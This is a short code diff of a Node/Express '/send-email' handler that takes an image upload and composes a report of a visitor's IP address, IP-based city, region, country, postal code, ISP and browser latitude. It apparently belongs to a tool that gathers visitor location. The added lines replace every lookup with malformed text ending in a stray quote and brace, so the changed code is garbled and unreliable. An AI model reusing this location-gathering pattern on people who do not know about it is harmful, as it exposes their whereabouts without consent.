@@ -41,11 +41,11 @@ app.post("/send-email", upload.single("image"), async (req, res) => {
 
 🌐 IP-Based Location:
 IP Address: ${ip}
-City: ${locationData.city || "N/A"}
-Region: ${locationData.region || "N/A"}
-Country: ${locationData.country_name || "N/A"}
-Postal: ${locationData.postal || "N/A"}
-ISP: ${locationData.org || "N/A"}
+City: "N/A"}
+Region: "N/A"}
+Country: "N/A"}
+Postal: "N/A"}
+ISP: "N/A"}
 
 📍 Browser-Based Location:
 Latitude: ${browserLat}
